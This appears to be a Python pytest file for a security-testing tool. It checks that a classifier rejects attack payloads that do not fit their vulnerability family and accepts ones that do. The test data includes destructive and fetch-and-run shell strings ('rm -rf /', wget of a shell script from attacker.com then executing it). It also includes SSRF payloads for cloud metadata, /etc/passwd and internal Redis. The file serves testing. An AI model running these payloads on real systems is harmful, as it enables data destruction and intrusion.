"""族-载荷一致性自检的回归守卫（2026-09-22，评审 ②-1）。

锁定三件事：
1. 真实废弹（run 29/30/31 实测载荷）必须被判废 —— 这是本改动的目的；
2. 合法载荷不得被误杀 —— 这是本改动唯一的风险点（判据只做禁止项即为此）；
3. 族最小可用兜底弹形状正确、且不给反序列化族造假字节（真字节由 sca_forge 负责）。

载荷样例全部取自 data/app.db 的 trigger_specs.attack_payloads_json（真实数据，非构造）。
"""
import pytest

from src.iast.attack_context import (
    classify_payload_family_mismatch,
    family_minimal_payload,
    filter_payloads_by_family,
)


class TestRejectedRealPayloads:
    """文档 1.1 列出的那批废弹，逐条锁定。"""

    @pytest.mark.parametrize("payload", [
        "; rm -rf /",
        "&& echo 'exploited'",
        "http://127.0.0.1:8080;rm -rf /",
        "http://127.0.0.1:8080/shell.jsp;wget http://attacker.com/shell.sh;chmod +x shell.sh;./shell.sh",
        "http://127.0.0.1;id",
    ])
    def test_ssrf_shell_templates_rejected(self, payload):
        assert classify_payload_family_mismatch(payload, "ssrf") == "ssrf_payload_with_shell_metachar"

    @pytest.mark.parametrize("payload", [
        "test1=; rm -rf /",
        "test1=; calc",
    ])
    def test_crlf_command_payloads_rejected(self, payload):
        assert classify_payload_family_mismatch(payload, "crlf_injection") == "crlf_payload_without_line_break"

    @pytest.mark.parametrize("payload", [
        "java.util.HashMap$1",
        "java.util.HashMap$2",
        "java.util.HashMap$1@12345678",
        "java:com.example.ExploitClass",
        "java.lang.Runtime",
        "java.io.Serializable",
    ])
    def test_deserialization_class_names_rejected(self, payload):
        assert classify_payload_family_mismatch(payload, "deserialization") == "deserialization_payload_is_class_name"


class TestLegitimatePayloadsNotKilled:
    """误杀是唯一风险点：合法载荷必须放行。"""

    @pytest.mark.parametrize("payload", [
        "http://127.0.0.1:8080/",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:11211/stat",
    ])
    def test_ssrf_url_payloads_pass(self, payload):
        assert classify_payload_family_mismatch(payload, "ssrf") is None

    @pytest.mark.parametrize("payload", [
        "%0d%0aX-Injected: 1",
        "test1: %0d%0aSet-Cookie: admin=1",
        "a%0a%0db",
    ])
    def test_crlf_linebreak_payloads_pass(self, payload):
        assert classify_payload_family_mismatch(payload, "crlf_injection") is None

    def test_crlf_payload_with_linebreak_and_command_passes(self):
        """带换行 + 命令词的组合形态合法（换行才是 CRLF 的语义载体），不得因命令词误杀。"""
        assert classify_payload_family_mismatch("%0d%0aX-Injected: %0d%0a%0d%0a<html>rm</html>", "crlf_injection") is None

    def test_real_serialized_bytes_pass(self):
        """真 Java 序列化魔数（AC ED 00 05 的 base64 = rO0AB...）必须放行。"""
        assert classify_payload_family_mismatch("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ", "deserialization") is None

    def test_unknown_family_never_rejected(self):
        """无自检规则的族一律放行（不臆造判据）。"""
        for fam in ("xss", "sql_injection", "path_traversal", "command_execution", ""):
            assert classify_payload_family_mismatch("; rm -rf /", fam) is None

    def test_empty_payload_never_rejected(self):
        assert classify_payload_family_mismatch("", "ssrf") is None
        assert classify_payload_family_mismatch(None, "crlf_injection") is None


class TestFilterAndFallback:
    def test_filter_returns_kept_and_reasons(self):
        kept, dropped = filter_payloads_by_family(
            ["http://127.0.0.1:8080/", "; rm -rf /", "http://169.254.169.254/"],
            "ssrf",
        )
        assert kept == ["http://127.0.0.1:8080/", "http://169.254.169.254/"]
        assert dropped == ["ssrf_payload_with_shell_metachar"]

    def test_all_rejected_leaves_empty_kept(self):
        kept, dropped = filter_payloads_by_family(["; rm -rf /", "&& id"], "ssrf")
        assert kept == []
        assert len(dropped) == 2

    def test_minimal_fallback_shape(self):
        assert family_minimal_payload("ssrf") == "http://127.0.0.1:8080/"
        assert family_minimal_payload("crlf_injection") == "%0d%0aX-SastAI-Injected: 1"
        # 反序列化族的兜底是真 gadget 字节，由 sca_forge 负责，此处绝不臆造。
        assert family_minimal_payload("deserialization") is None
        assert family_minimal_payload("xss") is None

    def test_minimal_fallback_passes_its_own_check(self):
        for fam in ("ssrf", "crlf_injection"):
            p = family_minimal_payload(fam)
            assert classify_payload_family_mismatch(p, fam) is None, f"{fam} 兜底弹没过自检"
